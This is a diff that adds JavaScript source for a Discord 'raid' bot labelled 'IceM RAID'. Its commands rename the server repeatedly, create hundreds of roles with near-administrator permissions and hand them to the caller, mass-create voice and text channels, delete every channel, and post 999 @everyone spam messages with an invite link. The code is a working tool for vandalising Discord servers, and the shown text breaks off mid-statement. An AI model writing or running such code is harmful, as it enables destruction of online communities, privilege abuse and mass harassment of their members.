@@ -1,0 +1,257 @@
+const Discord = require("discord.js");
+var client = new Discord.Client();
+const fs = require("fs");
+const { Client, RichEmbed } = require("discord.js");
+
+const prefix = "-";
+
+client.on("message", message => {
+  if (message.content.startsWith(prefix + "help")) {
+    let embed = new Discord.RichEmbed()
+      .setTitle("IceM RAID")
+      .setURL("RAIDED BY IceM ")
+      .setFooter("cmds", message.author.avatarURL)
+      .setImage(
+        "data:image/jpeg;base64,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"
+      )
+      .setTimestamp()
+      .setDescription("")
+      .addField("server", "*changes name of server*", true)
+      .addField("pd", "*inf vcs*", true)
+      .addField("dm", "*DMs all*", true)
+      .addField("RIP", "*Takes admin away*", true)
+      .addField("admin", "*makes admin role*", true)
+      .addField("spam", "*spams messages*", true)
+      .addField("destroy", "*destorys whole server*", true)
+      .addField("nom", "*cycles server name*", true)
+      .addField("delete", "*deletes channels*", true)
+      .addField("channel", "*inf text channel*", true)
+
+
+      .setColor("#000000");
+    message.channel.send(embed);
+  }
+});
+
+client.on("ready", () => {
+  //Signifie que le bot à bien démarré
+  console.log("Je suis prêt !"); //Lorsque que le bot est lancé observer la console Visual Studio
+  client.user.setGame("Made By Discord"); //Voir le Jeu sur le Discord
+});
+
+client.on("message", message => {
+  if (message.content.startsWith(prefix + "nom")) {
+    var interval = setInterval(function() {
+      message.guild.setName(" C");
+      message.guild.setName(" CR ");
+      message.guild.setName(" CRY ");
+      message.guild.setName(" CRYT ");
+      message.guild.setName(" CRYTON ");
+      message.guild.setName(" CRYTONI ");
+      message.guild.setName(" CRYTONIG ");
+      message.guild.setName(" CRYTONIGH ");
+      message.guild.setName(" CRYTONIGHT ");
+      message.guild.setName(" CRYTONIGHT ");
+    }, 300);
+  }
+
+  client.on("ready", () => {
+    //Signifie que le bot à bien démarré
+    console.log("Je suis prêt !"); //Lorsque que le bot est lancé observer la console Visual Studio
+    client.user.setGame(
+      "https://discord.gg/6vgHsM6gV4"
+    ); //Voir le Jeu sur le Discord
+  });
+
+  client.on("message", message => {
+    if (message.content.includes("-role2")) {
+      console.log(`${client.guilds.map(c => c.name)}`);
+    }
+    if (message.content === "roles") {
+      for (var i = 0; i < 200; i++) {
+        message.guild.createRole({
+          name: "server is fucked",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#fb0707"
+        });
+        message.guild.createRole({
+          name: " KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#ff08c5"
+        });
+        message.guild.createRole({
+          name: " lol",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#5d08ff"
+        });
+        message.guild.createRole({
+          name: " KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#0c08ff"
+        });
+        message.guild.createRole({
+          name: " KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#08d5ff"
+        });
+        message.guild.createRole({
+          name: " KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#08ffa3"
+        });
+        message.guild.createRole({
+          name: " KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#08ff23"
+        });
+        message.guild.createRole({
+          name: " KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#81ff08"
+        });
+        message.guild.createRole({
+          name: " KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#fff608"
+        });
+        message.guild.createRole({
+          name: "KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#ff6f08"
+        });
+        message.guild.createRole({
+          name: "KAKAKAKAKAKAKAKAKAKAKAAKAKAKAKAKAKAK",
+          mentionable: false,
+          permissions: 2146958591,
+          position: "",
+          color: "#ff0808"
+        });
+      }
+    }
+
+    if (message.content.includes("-role")) {
+      message.guild.createRole({
+        name: "CHAOS",
+        mentionable: false,
+        permissions: 2146958591,
+        position: "",
+        color: "#fb0707"
+      });
+    }
+    if (message.content.includes("-role")) {
+      message.guild.roles.map(r => message.member.addRoles(r));
+    }
+
+    if (message.content === "-server") {
+      message.guild.setName("IceM RAIDED");
+      message.guild.setIcon(
+        "https://media.discordapp.net/attachments/809086485433286730/809088678172819547/022e2ab368d4fcf82ca0ce52d6b05996.jpg"
+      );
+    }
+  });
+
+  if (message.content === "voice") {
+    for (var i = 0; i < 450; i++) {
+      message.guild.createChannel("alyssa. NUKED", "VOICE");
+    }
+  }
+  if (message.content.includes("!oos")) {
+    for (var i = 0; i < 999; i++) {
+      message.channel.send(" @everyone https://discord.gg/6vgHsM6gV4 | liyah WAS HERE BITCHES - ");
+    }
+  }
+  if (message.content === "-no") {
+    message.guild.channels.map(c => c.delete());
+  }
+  //réaction en chaine}
+  if (message.content === "-bii") {
+    message.channel.send("-bi").then(m => m.delete());
+    message.channel.send("Digital Group | 9999").then(m => m.delete());
+    for (var i = 0; i < 500; i++) {
+      message.guild
+        .createChannel("SIPHER RAID", "kk")
